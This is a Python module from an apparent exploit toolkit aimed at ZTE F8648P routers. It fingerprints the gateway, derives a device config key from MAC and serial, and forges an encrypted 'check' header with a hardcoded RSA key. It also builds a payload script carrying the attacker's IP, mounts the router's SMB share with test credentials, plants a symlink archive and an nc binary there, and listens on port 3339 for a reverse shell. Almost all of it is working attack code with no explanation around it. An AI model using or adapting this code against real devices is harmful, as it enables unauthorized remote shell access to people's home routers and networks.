from hashlib import sha256
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_PKCS1_v1_5
from Crypto.Cipher import AES
from base64 import b64decode,b64encode
from random import randint
from Crypto.Util.Padding import pad
import socket
import subprocess
from time import sleep
import struct
import psutil


# craft the "check" header
def checkheader(form):
    check = str(sha256(form.encode()).hexdigest())
    pubkey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAodPTerkUVCYmv28SOfRV7UKHVujx/HjCUTAWy9l0L5H0JV0LfDudTdMNPEKloZsNam3YrtEnq6jqMLJV4ASb1d6axmIgJ636wyTUS99gj4BKs6bQSTUSE8h/QkUYv4gEIt3saMS0pZpd90y6+B/9hZxZE/RKU8e+zgRqp1/762TB7vcjtjOwXRDEL0w71Jk9i8VUQ59MR1Uj5E8X3WIcfYSK5RWBkMhfaTRM6ozS9Bqhi40xlSOb3GBxCmliCifOJNLoO9kFoWgAIw5hkSIbGH+4Csop9Uy8VvmmB+B3ubFLN35qIa5OG5+SDXn4L7FeAA5lRiGxRi8tsWrtew8wnwIDAQAB'
    keyDER = b64decode(pubkey)
    keyPub = RSA.importKey(keyDER)
    cipher = Cipher_PKCS1_v1_5.new(keyPub)
    cipher_text = cipher.encrypt(check.encode())
    checkb64b = b64encode(cipher_text)
    checkb64 = checkb64b.decode()
    return(checkb64)

# generates random number key and iv for encoding
def randkeyiv():
    s = ''
    for i in range(16):
        s = s + str(randint(0,9))
    return s

# encoder
def encodepass(passwd):
    key = randkeyiv()
    iv = randkeyiv()
    encodedata = "{}+{}".format(key,iv)
    pubkey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAodPTerkUVCYmv28SOfRV7UKHVujx/HjCUTAWy9l0L5H0JV0LfDudTdMNPEKloZsNam3YrtEnq6jqMLJV4ASb1d6axmIgJ636wyTUS99gj4BKs6bQSTUSE8h/QkUYv4gEIt3saMS0pZpd90y6+B/9hZxZE/RKU8e+zgRqp1/762TB7vcjtjOwXRDEL0w71Jk9i8VUQ59MR1Uj5E8X3WIcfYSK5RWBkMhfaTRM6ozS9Bqhi40xlSOb3GBxCmliCifOJNLoO9kFoWgAIw5hkSIbGH+4Csop9Uy8VvmmB+B3ubFLN35qIa5OG5+SDXn4L7FeAA5lRiGxRi8tsWrtew8wnwIDAQAB'
    keyDER = b64decode(pubkey)
    keyPub = RSA.importKey(keyDER)
    cipher = Cipher_PKCS1_v1_5.new(keyPub)
    cipher_text = cipher.encrypt(encodedata.encode())
    encodeb = b64encode(cipher_text)
    encode = encodeb.decode()
    bkey = sha256(key.encode("utf8")).digest()
    biv = sha256(iv.encode("utf8")).digest()
    aes_cipher = AES.new(bkey, AES.MODE_CBC, biv[:16])
    passwdb = bytes(passwd,'utf8')
    while len(passwdb) % 16 != 0:
        passwdb += b'\x00'
    cipherpass = aes_cipher.encrypt(passwdb)
    cipherpassb64 = b64encode(cipherpass)
    return(encode,cipherpassb64)

# composes config key
def composekey(mac,serial):
    firstpart = serial[4:12].upper()
    macp = mac.split(':')
    secondpart = "{}{}{}{}{}{}".format(macp[5],macp[4],macp[3],macp[2],macp[1],macp[0])
    print("[Config Key]: {}{}".format(firstpart,secondpart))
    return("{}{}".format(firstpart,secondpart))

# obtains lan IP
def getlanip():
    IP = None
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
        print("[Getlanip]: Acquired local IP {}".format(IP))
    except Exception:
        print("[Getlanip]: Unable to retrieve local address")
    finally:
        s.close()
    return IP

# craft payload.sh
def prepare_payload(ip,nousb):
    skel = open("payload.skel","r")
    genpayload = open("payload.sh","w")
    for line in skel:
        if nousb == True:
            a = line.replace("[PLACEHOLDER1]","/mnt")
        else:
            a = line.replace("[PLACEHOLDER1]","/mnt/usb1_1_1")
        a = a.replace("[PLACEHOLDER2]",ip)
        genpayload.write(a)
    print("[Prepare_payload]: payload.sh ready")

# craft test.smb.conf
def prepare_testsmb(nousb):
    skel = open("test.smb.skel","r")
    genpayload = open("test.smb.conf","w")
    for line in skel:
        if nousb == True:
            a = line.replace("[PLACEHOLDER1]","/mnt")
        else:
            a = line.replace("[PLACEHOLDER1]","/mnt/usb1_1_1")
        genpayload.write(a)
    print("[Prepare_testsmb]: test.smb.conf ready")

# reverse shell listener
def getshell():
    from pwn import listen
    l = listen(3339)
    conn = l.wait_for_connection()
    line = conn.recvline()
    if line == b'\n':
        pass
    else:
        print(line)
    conn.interactive()
    conn.close()

# nousb commands
def nousb_run(host):
    print("[nousb]: Waiting 2 seconds for server startup...")
    sleep(2)
    subprocess.run(['mkdir','-p','dest'])
    print("[nousb]: Created dest/ mountpoint")
    a = subprocess.run(['mount','-t','cifs','-o','username=test,password=test,vers=1.0','\\\\'+host+'\\samba','dest'])
    if a.returncode != 0:
        print("[nousb]: Ensure that cifs-utils package is installed on the system or samba already mounted. Stopping")
        exit(0)
    print("[nousb]: Mounted router smb on dest/")
    sleep(1)
    subprocess.run(['unzip','-oqq','symlink.zip','-d','dest/'],capture_output=False, stderr=subprocess.DEVNULL)
    print("[nousb]: Symlink copied")
    subprocess.run(['cp','../bin/nc','dest/'])
    print("[nousb]: Nc copied")
    sleep(1)
    subprocess.run(['umount','dest'])
    print("[nousb]: Unmounted router smb")
    subprocess.run(['rm','-rf','dest'])
    print("[nousb]: Deleted dest/ mountpoint")

# obtains all gateways IP
def getgateways():
    """Read all gateways directly from /proc."""
    gw = []
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000':
                continue
            ip = str(socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))))
            if ip:
                gw.append(ip)
        return gw

# fingerprint gateway to check if it is a F8648P 
def detectrouterip(r,host):
    gw = getgateways()
    for a in gw:
        print("[detect_router]: Checking if gateway ({}) is a ZTE F8648P router".format(a))
        try:
            z = r.get("http://{}/".format(a), timeout=5)
        except:
            print("[detect_router]: Timeout waiting for gateway")
        else:
            if '<span id="pdtVer">&#70;&#56;&#54;&#52;&#56;&#80;</span>' in z.text:
                print("[detect_router]: It looks like {} is a ZTE F8648P router".format(a))
                return(a)

        print("[detect_router]: No match. Falling back to manual router IP input")
        print("What is the router IP? [default: {}]".format(host))
        routerip = str(input())
        if routerip != '':
            return(routerip)
        else:
            return(host)

def checkopenport():
    if 3339 in [i.laddr.port for i in psutil.net_connections()]:
        return True
    else:
        return False

